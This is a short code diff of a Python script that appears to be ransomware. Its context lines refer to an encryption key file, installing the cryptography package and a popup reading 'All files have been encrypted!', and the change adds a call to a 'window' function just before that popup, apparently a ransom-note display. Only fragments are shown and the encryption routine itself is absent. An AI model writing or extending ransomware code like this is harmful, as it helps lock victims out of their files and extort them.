@@ -6,6 +6,7 @@ import ctypes
 import socket
 from datetime import datetime, timedelta
 import time
+from window import window
 #Install cryptography module
 def install(package): # Install the required package
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -88,6 +89,7 @@ except:
 #os.remove("key.key")
 #os.remove("encryption_time.txt")
 #os.remove("unified_file.txt")
+window()
 if sys.platform == "linux":
     subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
 else:
